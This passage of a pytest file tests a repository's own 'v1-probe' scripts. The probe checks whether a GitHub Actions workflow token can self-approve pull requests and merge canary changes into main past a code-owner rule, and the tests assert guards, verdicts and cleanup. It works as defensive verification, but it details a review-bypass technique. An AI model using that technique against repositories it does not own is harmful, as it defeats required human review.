    probe_dir = ROOT / "scripts" / "v1-probe"
    canary = yaml.safe_load((probe_dir / "v1-canary.yml").read_text(encoding="utf-8"))
    assert (canary.get("on") or canary[True]) == "workflow_dispatch" and canary["permissions"] == {}
    assert [j["if"] for j in canary["jobs"].values()] == [False]
    assert all(j["permissions"] == {} for j in canary["jobs"].values())
    text = (probe_dir / "v1-probe.yml").read_text(encoding="utf-8")
    probe = yaml.safe_load(text)
    assert (probe.get("on") or probe[True]) == {"push": {"branches": ["probe/v1-runner"]}}
    assert probe["permissions"] == {}
    (job,) = probe["jobs"].values()
    assert job["permissions"] == {"contents": "write", "pull-requests": "write"}   # exactly the push job's
    assert "secrets." not in text and "uses:" not in text                        # no secret, no action, no checkout
    run = job["steps"][0]["run"]
    assert "for method in squash merge rebase" in run and '-f sha="$head"' in run
    # M2: three targets, and a GITHUB_TOKEN approval at the head before any merge try of each
    assert "for pair in W:probe/v1-target N:probe/v1-target-n H1:probe/v1-target-h1; do" in run
    assert run.index("event=APPROVE") < run.index("for method in squash merge rebase")
    assert '-f commit_id="$head"' in run
    # security Info (2026-11-17): the GraphQL merge path too, after the REST tries, pinned to the head, squash
    assert run.index("for method in squash merge rebase") < run.index("gh api graphql")
    assert "mergePullRequest(input: {pullRequestId: $id, expectedHeadOid: $oid, mergeMethod: SQUASH})" in run
    assert '-f oid="$head"' in run
    # the verdict markers in the script's own text never match the probe script's patterns (the log shows the source)
    assert not re.search(r"V1-(RESULT|MERGED|APPROVE) (W|N|H1) ", text)
    assert not (ROOT / ".github" / "workflows" / "v1-probe.yml").exists()
    assert not (ROOT / ".github" / "workflows" / "v1-canary.yml").exists()
    for name in ("v1-probe.sh", "v1-probe.ps1"):
        s = (ROOT / "scripts" / name).read_text(encoding="utf-8")
        assert "can_approve_pull_request_reviews=false" in s and "probe/v1-target" in s, name
    ps1 = (ROOT / "scripts" / "v1-probe.ps1").read_text(encoding="utf-8")
    assert not re.search(r"--jq '[^']*\"", ps1)


def test_the_v1_probe_scripts_agree():
    """v1-probe/verdict-from-main-sha: the .ps1 Brian runs and its tested .sh twin read the same evidence and use the
    same patterns and counts (no PowerShell on the test runner, so the .ps1 is checked by its text)."""
    sh = (ROOT / "scripts" / "v1-probe.sh").read_text(encoding="utf-8")
    ps1 = (ROOT / "scripts" / "v1-probe.ps1").read_text(encoding="utf-8")
    for s in (sh, ps1):
        assert "V1-(RESULT|MERGED|APPROVE) (W|N|H1) .*" in s
        assert "^V1-MERGED (W|N|H1) " in s and "code owner" in s and "-ci \"workflow\"" not in s
        assert "--jq '.merged'" in s and "HTTP 404" in s
        for part in (".github/workflows/v1-canary.yml", "sitegen/v1-probe-canary.txt", "data/v1-probe-CODEOWNERS",
                     "probe/v1-target-n", "probe/v1-target-h1", "git/trees", "parents[]="):
            assert part in s, part
        assert "PASS (V1')" in s and "is left on" in s and "(method refused)" in s
        assert "INCONCLUSIVE: could not read main. Nothing was changed." in s
        # v1-probe/rerun-after-fail (ADR 0010): no new run until R1' is on, owned, active and error-free
        for part in ("rules/branches/main", "select(.parameters.require_code_owner_review == true) | .ruleset_id",
                     "rulesets/$id", "--jq '.enforcement'", "contents/.github/CODEOWNERS?ref=main",
                     "codeowners/errors?ref=main", "--jq '.errors | length'", "@gn0sh", "not active"):
            assert part in s, part
        assert "-ExecutionPolicy Bypass" not in s
        # L-c v1-probe/verdict-race: the run must be completed, and .merged is read again after cleanup
        assert "--json status --jq '.status'" in s and "had not finished" in s
        assert "read again after cleanup" in s and s.rindex("read again after cleanup") > s.index("Cleanup" if s is ps1
                                                                                                 else "cleanup()")
    # nothing changes before the guard, checked per script by name (v1-probe/rerun-after-fail-test-gap)
    for name, text, first_write in (("v1-probe.sh", sh, ': > "$results"'),
                                    ("v1-probe.ps1", ps1, "Set-Content -Path $results")):
        guard_end = text.index("codeowners/errors?ref=main")
        assert text.index("rules/branches/main") < guard_end < text.index(first_write), name
        assert "-X" not in text[text.index("rules/branches/main"):guard_end], name
    assert "run scripts/protect-main.sh first" in sh and "run scripts\\protect-main.ps1 first" in ps1
    # FAIL never from main's sha alone: the FAIL condition names only the merge answers, the PR and the canary
    fail_sh = next(ln for ln in sh.splitlines() if "^V1-MERGED" in ln and ln.startswith("if "))
    fail_ps1 = next(ln for ln in ps1.splitlines() if "$merged -gt 0" in ln)
    for ln in (fail_sh, fail_ps1):
        assert "main_after" not in ln and "mainAfter" not in ln, ln
        assert "merged" in ln.lower() and ("on_main" in ln or "onMain" in ln), ln


_V1_STUB = '''#!/usr/bin/env python3
import json, os, sys
R1_RULES = '[{"type": "deletion", "ruleset_id": 1}, {"type": "pull_request", "ruleset_id": 1, "parameters": {"required_approving_review_count": 0, "require_code_owner_review": true}}]'
a = sys.argv[1:]
with open(os.environ["GH_CALLS"], "a") as f:
    f.write(json.dumps(a) + "\\n")
def count(name):
    p = os.environ["GH_CALLS"] + "." + name
    n = int(open(p).read()) if os.path.exists(p) else 0
    open(p, "w").write(str(n + 1))
    return n
if a[:2] == ["auth", "status"]:
    print("Token scopes: 'gist', 'read:org', 'repo', 'workflow'"); sys.exit(0)
if a[:2] == ["pr", "list"]:
    print(os.environ.get("DATA_PRS", "1")); sys.exit(0)
if a[:2] == ["run", "list"]:
    print("123"); sys.exit(0)
if a[:2] == ["run", "watch"]:
    sys.exit(0)
if a[:2] == ["run", "view"] and "--json" in a:
    assert a[a.index("--json") + 1] == "status" and a[a.index("--jq") + 1] == ".status", a
    print(os.environ.get("RUN_STATUS", "completed")); sys.exit(0)
if a[:2] == ["run", "view"]:
    sys.stdout.write(open(os.environ["RUN_LOG"]).read()); sys.exit(0)
path = [x for x in a if x.startswith("repos/")][0]
# v1-probe/rerun-after-fail: the guard's reads (R1' on, its rulesets active, CODEOWNERS on main, no errors). The
# stub holds GitHub's JSON and applies the script's own --jq with jq, as gh does; "FAIL" answers like a gh api error.
guard = {"/rules/branches/main": ("RULES", R1_RULES), "/codeowners/errors?ref=main": ("OWNER_ERRORS", '{"errors": []}'),
         "/contents/.github/CODEOWNERS?ref=main": ("CODEOWNERS", "# ADR 0010\\n* @gn0sh\\n/data/\\n")}
rs = path.rsplit("/rulesets/", 1)
if len(rs) == 2:
    guard["/rulesets/" + rs[1]] = ("RULESET_" + rs[1], '{"id": %s, "enforcement": "active", "bypass_actors": %s}'
                                   % (rs[1], os.environ.get("BYPASS", "[]")))
for suffix, (var, default) in guard.items():
    if path.endswith(suffix):
        body = os.environ.get(var, default)
        if body == "FAIL":
            print('{"message":"Server Error","status":"502"}'); sys.stderr.write("gh: Server Error (HTTP 502)\\n"); sys.exit(1)
        if "--jq" in a:
            import subprocess
            body = subprocess.run(["jq", "-r", a[a.index("--jq") + 1]], input=body, capture_output=True, text=True,
                                  check=True).stdout
        sys.stdout.write(body); sys.exit(0)
if path.endswith("/git/ref/heads/main"):
    sha = os.environ.get("MAIN_BEFORE", "1" * 40) if count("main") == 0 else os.environ.get("MAIN_AFTER", "1" * 40)
    if sha == "EMPTY":
        sys.stderr.write("gh: Bad gateway (HTTP 502)\\n"); sys.exit(1)
    print(sha); sys.exit(0)
if path.endswith("?ref=main") and "/contents/" in path:
    var = {"/contents/.github/workflows/v1-canary.yml?ref=main": "CANARY",
           "/contents/sitegen/v1-probe-canary.txt?ref=main": "CANARY_N",
           "/contents/data/v1-probe-CODEOWNERS?ref=main": "CANARY_H1"}[path[path.index("/contents/"):]]
    canary = os.environ.get(var, "404")
    if canary == "on-main":
        print("e" * 40); sys.exit(0)
    sys.stderr.write("gh: Not Found (HTTP 404)\\n" if canary == "404" else "gh: Bad gateway (HTTP 502)\\n"); sys.exit(1)
PRS = {"77": "", "78": "_N", "79": "_H1"}         # W, N, H1
if path.rsplit("/", 1)[-1] in PRS and "/pulls/" in path and "--jq" in a and a[a.index("--jq") + 1] == ".merged":
    sfx = PRS[path.rsplit("/", 1)[-1]]
    merged = os.environ.get("PR_MERGED" + sfx, "false")
    if count("merged" + sfx) > 0:            # the read after cleanup (L-c)
        merged = os.environ.get("PR_MERGED_AFTER" + sfx, merged)
    if merged == "EMPTY":
        sys.exit(1)
    print(merged); sys.exit(0)
if "-X" in a and a[a.index("-X") + 1] == "PUT" and "/contents/" in path:
    if "branch=probe/v1-runner" in a:
        print("9" * 40)
    elif count("canary") == 0:
        print("c" * 40 + "\\tblob")
    else:
        print("d" * 40)
    sys.exit(0)
if path.endswith("/pulls") and "POST" in a:
    head = next(x.split("=", 1)[1] for x in a if x.startswith("head="))
    print({"probe/v1-target": "77", "probe/v1-target-n": "78", "probe/v1-target-h1": "79"}[head]); sys.exit(0)
if "/contents/.github/CODEOWNERS?ref=" in path:                 # the blob H1 renames, read at main_before
    assert a[a.index("--jq") + 1] == ".sha", a
    print("b" * 40); sys.exit(0)
if "/git/commits/" in path:
    print("t" * 40); sys.exit(0)
if path.endswith("/git/trees"):
    open(os.environ["GH_CALLS"] + ".tree", "w").write(sys.stdin.read())
    print("a" * 40); sys.exit(0)
if path.endswith("/git/commits"):
    print("f" * 40); sys.exit(0)
if path.endswith("/reviews"):
    print(os.environ.get("KEPT", "c" * 40)); sys.exit(0)
sys.exit(0)
'''
_SOURCE = ('probe\\tTry\\t2026-11-18T09:00:00Z echo "V1-RESULT $t $method exit=$code $(printf ...)"\n'
           'probe\\tTry\\t2026-11-18T09:00:00Z if [ "$code" = 0 ]; then echo "V1-MERGED $t $method"; exit 0; fi\n'
           'probe\\tTry\\t2026-11-18T09:00:00Z echo "V1-APPROVE $t exit=$code $(printf ...)"\n')
_OWNER = '{"message":"Repository rule violations found\\n\\nWaiting on code owner review from gn0sh."}'
_GQL_OWNER_MSG = "GraphQL: Repository rule violations found Waiting on code owner review from gn0sh. (mergePullRequest)"
_METHOD = '{"message":"Merge method {m} is not allowed on this repository"}'
_WORKFLOWS = ('{"message":"refusing to allow a GitHub App to create or update workflow '
              '`.github/workflows/v1-canary.yml` without `workflows` permission"}')
_TARGETS = ("W", "N", "H1")


def _line(text):
    return f"probe\tTry\t2026-11-18T09:00:01Z {text}\n"


def _target(t, squash=None, graphql=None, merge=None, rebase=None, approve="0 APPROVED"):
    """One target's lines as the runner prints them: the bot approval, then squash, merge, rebase, GraphQL."""
    out = _line(f"V1-APPROVE {t} exit={approve}") if approve is not None else ""
    for m, answer in (("squash", squash or "1 " + _OWNER), ("merge", merge or "1 " + _METHOD.replace("{m}", "merge")),
                      ("rebase", rebase or "1 " + _METHOD.replace("{m}", "rebase")),
                      ("graphql", graphql or "1 " + _GQL_OWNER_MSG)):
        if answer == "SKIP":
            continue
        out += _line(f"V1-RESULT {t} {m} exit={answer}")
        if answer.startswith("0"):
            return out + _line(f"V1-MERGED {t} {m}")
    return out


def _run_log(**over):
    """The whole run: every target refused for code-owner review, unless `over` gives a target's own lines."""
    return _SOURCE + "".join(over.get(t, _target(t)) for t in _TARGETS)


_ALL_REFUSED = _run_log()


def _v1(tmp_path, log, main_after=None, kept=None, data_prs="1", **extra):
    bindir, calls = tmp_path / "bin", tmp_path / "calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_V1_STUB)
    (bindir / "sleep").write_text("#!/bin/sh\nexit 0\n")
    for f in ("gh", "sleep"):
        (bindir / f).chmod(0o755)
    (tmp_path / "log").write_text(log)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls),
           "RUN_LOG": str(tmp_path / "log"), "RESULTS_DIR": str(tmp_path), "DATA_PRS": data_prs,
           **({"MAIN_AFTER": main_after} if main_after else {}), **({"KEPT": kept} if kept else {}), **extra}
    r = subprocess.run(["bash", str(ROOT / "scripts" / "v1-probe.sh")], env=env, capture_output=True, text=True)
    made = [json.loads(ln) for ln in calls.read_text().splitlines()] if calls.exists() else []
    return r, made


def _turned_off(made):
    return any("can_approve_pull_request_reviews=false" in c for c in made)


_RULE = '{"type": "pull_request", "ruleset_id": %d, "parameters": {"require_code_owner_review": %s}}'


@pytest.mark.parametrize("extra", [
    {"RULES": "[" + _RULE % (1, "false") + "]"},                                    # the rule is off
    {"RULES": '[{"type": "deletion", "ruleset_id": 1}]'},                            # no pull_request rule
    {"RULES": "FAIL"},                                                              # gh api error (JSON body, exit 1)
    {"RULES": "[" + _RULE % (1, "true") + ", " + _RULE % (2, "true") + "]", "RULESET_2": '{"enforcement": "evaluate"}'},
    {"RULESET_1": '{"enforcement": "disabled"}'},
    {"RULESET_1": "FAIL"},
    {"CODEOWNERS": "FAIL"},                                                         # no CODEOWNERS on main (404)
    {"CODEOWNERS": "/data/\n"},                                                    # the rule is vacuous: no owner
    {"CODEOWNERS": "# * @gn0sh\n* @someone-else\n"},
    {"OWNER_ERRORS": '{"errors": [{"line": 2, "kind": "Unknown owner"}]}'},
    {"OWNER_ERRORS": "FAIL"},
    # v1-probe/rerun-after-fail-codeowners-override: `* @gn0sh` first, then only `/data/`
    {"CODEOWNERS": "* @gn0sh\n/.github/ @someone-else\n"},
    {"CODEOWNERS": "* @gn0sh\n/data/\n*\n"},
    {"CODEOWNERS": "/data/\n* @gn0sh\n"},
    {"CODEOWNERS": "* @gn0sh @someone-else\n/data/\n"},
    {"CODEOWNERS": "* @GN0SH\n"},
    {"CODEOWNERS": ""},
    # v1-probe/rerun-after-fail-bypass: the bypass list is empty or exactly the admin role in pull request mode
    {"BYPASS": '[{"actor_id": 5, "actor_type": "RepositoryRole", "bypass_mode": "always"}]'},
    {"BYPASS": '[{"actor_id": 15368, "actor_type": "Integration", "bypass_mode": "pull_request"}]'},
    {"BYPASS": '[{"actor_id": 4, "actor_type": "RepositoryRole", "bypass_mode": "pull_request"}]'},
    {"BYPASS": '[{"actor_id": 5, "actor_type": "RepositoryRole", "bypass_mode": "pull_request"}, '
               '{"actor_id": 1, "actor_type": "DeployKey", "bypass_mode": "always"}]'},
    {"BYPASS": "null"},                                                             # no bypass list: fail closed
], ids=["rule-off", "no-pr-rule", "rules-read-fails", "one-ruleset-evaluate", "ruleset-disabled", "ruleset-read-fails",
        "no-codeowners", "codeowners-no-owner", "codeowners-other-owner", "codeowners-errors", "errors-read-fails",
        "codeowners-github-override", "codeowners-unowned-all", "codeowners-wrong-order", "codeowners-two-owners",
        "codeowners-case", "codeowners-empty", "bypass-always", "bypass-actions-app", "bypass-write-role",
        "bypass-extra-actor", "bypass-unread"])
def test_v1_probe_refuses_to_run_again_before_the_code_owner_rule(tmp_path, extra):
    """v1-probe/rerun-after-fail (ADR 0010): after the 2026-11-18 FAIL a new run would merge the canary into main
    again, so the script stops, changing nothing, unless R1' really binds: the code-owner rule on main, every ruleset
    carrying it active, .github/CODEOWNERS on main with `* @gn0sh`, and no CODEOWNERS errors. A failed read stops it."""
    r, made = _v1(tmp_path, _ALL_REFUSED, **extra)
    assert r.returncode == 1 and r.stdout.startswith("Stopped: ") and "Nothing was changed." in r.stdout, r.stdout
    assert "run scripts/protect-main.sh first" in r.stdout
    assert not any("-X" in c for c in made), made
    assert not list(tmp_path.glob("v1-probe-results-*.txt"))


@pytest.mark.parametrize("extra", [
    {},
    {"CODEOWNERS": "* @gn0sh\n"},
    {"CODEOWNERS": "# ADR 0010\r\n\r\n*\t  @gn0sh  \r\n/data/\r\n"},
    {"BYPASS": '[{"actor_id": 5, "actor_type": "RepositoryRole", "bypass_mode": "pull_request"}]'},
], ids=["committed", "no-data-line", "crlf-and-spacing", "admin-pr-bypass"])
def test_v1_probe_guard_allows_only_the_r1_prime_shapes(tmp_path, extra):
    """v1-probe/rerun-after-fail-codeowners-override, -bypass: these pass the guard (and the run goes on to PASS)."""
    r, made = _v1(tmp_path, _ALL_REFUSED, **extra)
    assert r.returncode == 0 and "PASS" in r.stdout, r.stdout + r.stderr


def test_v1_probe_guard_runs_before_the_auth_refresh():
    """Nit from the PR #41 review: a refusal must not open a browser first; both scripts guard before
    `gh auth refresh`, and the .ps1 compares case-sensitively."""
    for name in ("v1-probe.sh", "v1-probe.ps1"):
        text = (ROOT / "scripts" / name).read_text(encoding="utf-8")
        assert text.index("codeowners/errors?ref=main") < text.index("gh auth refresh -h github.com"), name
        assert text.index("rules/branches/main") < text.index("gh auth refresh -h github.com"), name
    ps1 = (ROOT / "scripts" / "v1-probe.ps1").read_text(encoding="utf-8")
    assert "$coRules -cne '* @gn0sh' -and $coRules -cne '* @gn0sh|/data/'" in ps1
    assert "$bypass -cne 'RepositoryRole:5:pull_request'" in ps1 and "$enforcement -cne 'active'" in ps1
    assert "$ownerErrors -cne '0'" in ps1
    sh = (ROOT / "scripts" / "v1-probe.sh").read_text(encoding="utf-8")
    assert "'* @gn0sh'|'* @gn0sh|/data/') ;;" in sh and '"RepositoryRole:5:pull_request"' in sh
    for text in (sh, ps1):
        assert "--jq '.bypass_actors[] | [.actor_type, .actor_id, .bypass_mode] | @tsv'" in text


def test_v1_probe_runs_when_one_ruleset_has_the_rule_off_and_another_on(tmp_path):
    """v1-probe/rerun-after-fail-test-gap: rules from two rulesets, false then true (only the second active): the
    rule binds, and only the ruleset carrying it is read."""
    rules = "[" + _RULE % (1, "false") + ", " + _RULE % (2, "true") + "]"
    r, made = _v1(tmp_path, _ALL_REFUSED, RULES=rules, RULESET_1='{"enforcement": "disabled"}')
    assert r.returncode == 0 and "PASS" in r.stdout, r.stdout + r.stderr
    assert not any(str(x).endswith("/rulesets/1") for c in made for x in c)


def test_v1_probe_pass(tmp_path):
    r, made = _v1(tmp_path, _ALL_REFUSED)
    assert r.returncode == 0 and "PASS (V1')" in r.stdout, r.stdout + r.stderr
    assert not _turned_off(made)
    review = next(c for c in made if any(str(x).endswith("/reviews") for x in c))
    assert f"commit_id={'c' * 40}" in review and "repos/gn0sh/clarksville-records/pulls/77/reviews" in review
    # cleanup: every probe PR is closed and every probe branch deleted, before and after
    for n in ("77", "78", "79"):
        assert any("state=closed" in c and f"repos/gn0sh/clarksville-records/pulls/{n}" in c for c in made), n
    for b in ("probe/v1-target", "probe/v1-target-n", "probe/v1-target-h1", "probe/v1-runner"):
        assert sum(c[:3] == ["api", "-X", "DELETE"] and c[3].endswith("heads/" + b) for c in made) >= 2, b
    assert list(tmp_path.glob("v1-probe-results-*.txt"))


def test_v1_probe_builds_the_three_targets(tmp_path):
    """M2 and H1 (security, PR #43): W adds a workflow file; N adds one non-workflow file outside data/ (sitegen/);
    H1 only renames .github/CODEOWNERS into data/: a tree on main's tree that deletes the old path and adds the same
    blob (read at main's sha) at the new one, one commit whose parent is main."""
    r, made = _v1(tmp_path, _ALL_REFUSED)
    assert r.returncode == 0, r.stdout + r.stderr
    puts = [c for c in made if c[:3] == ["api", "-X", "PUT"] and "/contents/" in c[3]]
    assert [c[3].split("/contents/")[1] for c in puts] == [".github/workflows/v1-canary.yml"] * 2 + [
        "sitegen/v1-probe-canary.txt", ".github/workflows/v1-probe.yml"]
    assert "branch=probe/v1-target-n" in puts[2]
    tree = json.loads((tmp_path / "calls.tree").read_text())
    assert tree == {"base_tree": "t" * 40, "tree": [
        {"path": ".github/CODEOWNERS", "mode": "100644", "type": "blob", "sha": None},
        {"path": "data/v1-probe-CODEOWNERS", "mode": "100644", "type": "blob", "sha": "b" * 40}]}
    blob_read = [c for c in made if any("/contents/.github/CODEOWNERS?ref=" in str(x) and "ref=main" not in str(x)
                                        for x in c)]
    assert len(blob_read) == 1 and f"contents/.github/CODEOWNERS?ref={'1' * 40}" in " ".join(blob_read[0])
    commit = next(c for c in made if c[:4] == ["api", "-X", "POST", "repos/gn0sh/clarksville-records/git/commits"])
    assert f"tree={'a' * 40}" in commit and f"parents[]={'1' * 40}" in commit
    ref = [c for c in made if c[:4] == ["api", "-X", "POST", "repos/gn0sh/clarksville-records/git/refs"]]
    assert "ref=refs/heads/probe/v1-target-h1" in ref[2] and f"sha={'f' * 40}" in ref[2]
    prs = [c for c in made if c[:4] == ["api", "-X", "POST", "repos/gn0sh/clarksville-records/pulls"]]
    assert [next(x for x in c if x.startswith("head=")) for c in prs] == [
        "head=probe/v1-target", "head=probe/v1-target-n", "head=probe/v1-target-h1"]
    assert all("base=main" in c for c in prs)


def _merged_line(t, m):
    return _target(t, **{m: "0 {\"merged\":true}"})


@pytest.mark.parametrize("log,extra", [
    (_run_log(W=_merged_line("W", "squash")), {"PR_MERGED": "true", "MAIN_AFTER": "2" * 40}),
    (_run_log(W=_merged_line("W", "graphql")), {"PR_MERGED": "true", "MAIN_AFTER": "2" * 40}),
    (_run_log(N=_merged_line("N", "graphql")), {}),                       # even before the PR reads merged
    (_run_log(H1=_merged_line("H1", "squash")), {}),                      # H1: the rename merged
    (_ALL_REFUSED, {"PR_MERGED": "true"}),                                # the PR reads merged, whatever the log says
    (_ALL_REFUSED, {"PR_MERGED_H1": "true"}),
    (_ALL_REFUSED, {"CANARY": "on-main"}),                                # a probe file reached main
    (_ALL_REFUSED, {"CANARY_N": "on-main"}),
    (_ALL_REFUSED, {"CANARY_H1": "on-main"}),
], ids=["w-squash", "w-graphql", "n-graphql-answer-only", "h1-squash", "w-pr-merged", "h1-pr-merged", "w-on-main",
        "n-on-main", "h1-on-main"])
def test_v1_probe_fail_turns_the_actions_pr_setting_off(tmp_path, log, extra):
    r, made = _v1(tmp_path, log, **extra)
    assert r.returncode == 2 and "FAIL (V1' false)" in r.stdout and _turned_off(made), r.stdout + r.stderr
    closed = {n for n in ("77", "78", "79") if any("state=closed" in c and c[3].endswith("/pulls/" + n) for c in made)}
    merged = {"77" if extra.get("PR_MERGED") == "true" else None, "79" if extra.get("PR_MERGED_H1") == "true" else None}
    assert closed == {"77", "78", "79"} - merged                         # a merged PR is not closed again


@pytest.mark.parametrize("extra", [
    {"MAIN_AFTER": "2" * 40},              # main moved (another merge in the window), the probe PRs unmerged
    {"MAIN_AFTER": "EMPTY"},               # main could not be read after
    {"PR_MERGED": "EMPTY"},                # a probe PR could not be read
    {"PR_MERGED_N": "EMPTY"},
    {"CANARY": "error"},                   # a probe file check failed (not a 404)
    {"CANARY_H1": "error"},
], ids=["main-moved", "main-read-failed", "pr-read-failed", "n-read-failed", "canary-read-failed", "h1-read-failed"])
def test_v1_probe_main_moved_or_a_failed_read_is_inconclusive_and_leaves_r2_on(tmp_path, extra):
    """v1-probe/verdict-from-main-sha: FAIL only when a probe PR merged or a probe file is on main."""
    r, made = _v1(tmp_path, _ALL_REFUSED, **extra)
    assert r.returncode == 1 and "INCONCLUSIVE" in r.stdout and "is left on" in r.stdout, r.stdout + r.stderr
    assert not _turned_off(made) and "FAIL" not in r.stdout
    assert sum("state=closed" in c for c in made) == 3                    # cleanup still closes every probe PR


@pytest.mark.parametrize("status", ["in_progress", "queued", "EMPTY"])
def test_v1_probe_a_run_not_completed_is_inconclusive(tmp_path, status):
    """L-c: answers read while the run may still be merging are not final."""
    r, made = _v1(tmp_path, _ALL_REFUSED, RUN_STATUS="" if status == "EMPTY" else status)
    assert r.returncode == 1 and "had not finished" in r.stdout and "PASS" not in r.stdout, r.stdout + r.stderr
    assert not _turned_off(made)


@pytest.mark.parametrize("sfx", ["", "_N", "_H1"])
def test_v1_probe_a_merge_seen_after_cleanup_is_fail(tmp_path, sfx):
    """L-c: every probe PR is closed first, then read again; merged by then means FAIL, never PASS."""
    r, made = _v1(tmp_path, _ALL_REFUSED, **{"PR_MERGED_AFTER" + sfx: "true"})
    assert r.returncode == 2 and "FAIL (V1' false)" in r.stdout and "PASS" not in r.stdout and _turned_off(made)
    closed = max(i for i, c in enumerate(made) if "state=closed" in c)
    reads = [i for i, c in enumerate(made) if c[-2:] == ["--jq", ".merged"]]
    assert len(reads) >= 4 and reads[0] < closed < reads[-1]


def test_v1_probe_pass_needs_the_read_after_cleanup(tmp_path):
    r, made = _v1(tmp_path, _ALL_REFUSED, PR_MERGED_AFTER_N="EMPTY")
    assert r.returncode == 1 and "could not be read again after cleanup" in r.stdout and "PASS" not in r.stdout
    assert not _turned_off(made)


_STEP_GH = """#!/usr/bin/env python3
import os, sys
a = sys.argv[1:]
with open(os.environ["GH_CALLS"], "a") as f:
    f.write(" ".join(a) + "\\n")
nums = {"probe/v1-target": "77", "probe/v1-target-n": "78", "probe/v1-target-h1": "79"}
if a[1].startswith("repos/o/r/pulls?state=open"):
    print(nums[a[1].split("head=o:", 1)[1]]); sys.exit(0)
if a[1].startswith("repos/o/r/pulls/") and a[-1] == ".head.sha":
    print("e" * 40); sys.exit(0)
if a[1].startswith("repos/o/r/pulls/") and a[-1] == ".node_id":
    if os.environ.get("NODE") == "FAIL":
        sys.exit(1)
    print(os.environ.get("NODE", "PR_node")); sys.exit(0)
if "-X" in a and a[a.index("-X") + 1] == "POST" and a[a.index("-X") + 2].endswith("/reviews"):
    assert "event=APPROVE" in a and "commit_id=" + "e" * 40 in a, a
    print("APPROVED"); sys.exit(0)
num = next(x for x in a if x.startswith("repos/o/r/pulls/")).split("/")[4] if a[1] != "graphql" else os.environ.get("GQL_PR", "")
method = "graphql" if a[1] == "graphql" else next(x.split("=", 1)[1] for x in a if x.startswith("merge_method="))
if os.environ.get("MERGE_OK") == method and os.environ.get("MERGE_PR", "77") in (num, "any"):
    print('{"merged": true}'); sys.exit(0)
sys.stderr.write("gh: Repository rule violations found. Waiting on code owner review from gn0sh.\\n")
sys.exit(1)
"""


def _step(tmp_path, **env_over):
    step = yaml.safe_load((ROOT / "scripts" / "v1-probe" / "v1-probe.yml").read_text(encoding="utf-8"))
    run = next(iter(step["jobs"].values()))["steps"][0]["run"]
    bindir, calls = tmp_path / "bin", tmp_path / "calls"
    bindir.mkdir()
    (bindir / "gh").write_text(_STEP_GH)
    (bindir / "gh").chmod(0o755)
    (tmp_path / "step.sh").write_text(run)
    env = {**os.environ, "PATH": f"{bindir}:{os.environ['PATH']}", "GH_CALLS": str(calls), "GH_TOKEN": "t",
           "GITHUB_REPOSITORY": "o/r", "OWNER": "o", "MERGE_OK": "", **env_over}
    r = subprocess.run(["bash", "-e", str(tmp_path / "step.sh")], env=env, capture_output=True, text=True)
    return r, calls.read_text().splitlines()


@pytest.mark.parametrize("ok", ["", "squash", "rebase"])
def test_the_v1_probe_step_tries_every_target_and_merge_under_bash_e(tmp_path, ok):
    """v1-probe/step-exits-on-first-refusal: GitHub runs the step as `bash -e {0}`; for W, N and H1 in turn the bot
    approves at the head (M2), then a refused merge is printed and the next one tried; the first merge that goes
    through (here on W) stops the whole run."""
    r, calls = _step(tmp_path, MERGE_OK=ok)
    assert r.returncode == 0, r.stdout + r.stderr
    out = r.stdout.splitlines()
    results = [ln.split()[1:3] for ln in out if ln.startswith("V1-RESULT ")]
    tried = ["squash", "merge", "rebase", "graphql"]
    if ok:
        assert results == [["W", m] for m in tried[:tried.index(ok) + 1]], out
        assert [ln for ln in out if ln.startswith("V1-MERGED ")] == [f"V1-MERGED W {ok}"]
    else:
        assert results == [[t, m] for t in ("W", "N", "H1") for m in tried], out
        assert not [ln for ln in out if ln.startswith("V1-MERGED ")]
        assert [ln for ln in out if ln.startswith("V1-APPROVE ")] == [f"V1-APPROVE {t} exit=0 APPROVED"
                                                                       for t in ("W", "N", "H1")]
        for ln in out:
            if ln.startswith("V1-RESULT "):
                assert "exit=1" in ln and "code owner" in ln, ln
    # the approval comes before every merge try of the same PR
    for n in ("77", "78", "79"):
        idx = [i for i, c in enumerate(calls) if f"pulls/{n}/" in c and ("/reviews" in c or "/merge" in c)]
        if idx:
            assert "/reviews" in calls[idx[0]], calls


@pytest.mark.parametrize("node", ["FAIL", ""])
def test_the_v1_probe_step_says_when_it_cannot_read_the_node_id(tmp_path, node):
    """v1-probe/node-read-under-e: a failed or empty node_id read prints V1-ERROR before the step exits, and no
    GraphQL merge is tried."""
    r, calls = _step(tmp_path, NODE=node)
    assert r.returncode == 1 and r.stdout.splitlines()[-1] == "V1-ERROR: could not read node_id", r.stdout
    assert [ln.split()[2] for ln in r.stdout.splitlines() if ln.startswith("V1-RESULT ")] == ["squash", "merge", "rebase"]
    assert not any(c.startswith("api graphql") for c in calls)


def test_v1_probe_fail_keeps_actions_on_and_removes_the_canary_by_pr(tmp_path):
    """T4.11.3 (ADR 0010, invariant "V1 is false" T1-T8): FAIL turns R2 off (kept), then says to remove the canary
    by a person's PR and leave the baseline and MORNING_NOTE_SEND unset. "Turn off Actions" and "close every open
    PR" are dropped: only a writer can start a workflow that merges. sh and ps1 say it the same way."""
    r, made = _v1(tmp_path, _ALL_REFUSED, CANARY="on-main")
    assert r.returncode == 2 and _turned_off(made), r.stdout
    keep = "Leave GitHub Actions on and open pull requests open: only someone with write access can start a workflow"
    canary = "The canary is removed by a person's pull request"
    unset = "Leave MAIN_PR_BASELINE and MORNING_NOTE_SEND unset."
    out = r.stdout
    assert out.index("Turned off: workflows can no longer open pull requests") < out.index(keep) \
        < out.index(canary) < out.index(unset), out
    assert "data off main, goes to a Brain Trust (ADR 0010)" in out
    for name in ("v1-probe.sh", "v1-probe.ps1"):
        text = (ROOT / "scripts" / name).read_text(encoding="utf-8")
        assert keep in text and canary in text and unset in text, name
        for gone in ("Disable actions", "Close every open pull request", "head branch", "turn off GitHub Actions"):
            assert gone not in text, (name, gone)
    flat = " ".join((ROOT / "docs" / "ops" / "morning-note.md").read_text(encoding="utf-8").split())
    sec = flat[flat.index("**V1 probe: FAIL on 2026-11-18"):flat.index("`github-pages` deploys from `main` only")]
    assert "Actions stays on and open pull requests stay open" in sec and "Disable actions" not in sec
    assert "close every open" not in sec.lower() and "Brain Trust" in sec


_OTHER = '1 {"message":"Pull Request is not mergeable"}'


@pytest.mark.parametrize("log,kept", [
    (_run_log(W=_target("W", squash=_OTHER)), None),                                  # REST squash, other reason
    (_run_log(N=_target("N", squash="1 " + _WORKFLOWS)), None),                       # workflows, not code owner
